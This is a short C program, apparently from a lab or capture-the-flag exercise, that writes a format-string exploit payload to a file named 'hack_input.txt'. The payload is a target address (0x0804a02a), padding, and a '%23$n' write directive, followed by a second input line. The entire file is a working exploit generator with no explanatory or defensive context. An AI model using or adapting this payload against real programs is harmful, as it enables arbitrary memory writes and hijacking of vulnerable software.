#include <stdio.h>
#include <string.h>

int main()
{
    // Define the buffer containing the data you want to write to the file
    char buffer[80];

    strcpy(buffer, "\x2a\xa0\x04\x08");
    strcat(buffer, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    strcat(buffer, "%23$n");
    strcat(buffer, "\n");
    strcat(buffer, "WilliamL");

    // Open a file for writing (or create it if it doesn't exist)
    FILE *file = fopen("hack_input.txt", "w");

    // Check if the file was opened successfully
    if (file == NULL)
    {
        perror("Error opening file");
        return 1; // Return an error code
    }

    // Write the contents of the buffer to the file
    if (fwrite(buffer, sizeof(char), sizeof(buffer) - 1, file) != sizeof(buffer) - 1)
    {
        perror("Error writing to file");
        fclose(file); // Close the file before exiting
        return 1;     // Return an error code
    }

    // Close the file
    fclose(file);

    printf("Data written to file successfully.\n");

    return 0; // Return 0 to indicate success
}